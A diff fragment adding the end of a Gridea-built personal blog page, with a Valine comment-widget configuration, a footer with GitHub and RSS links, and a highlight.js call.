+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
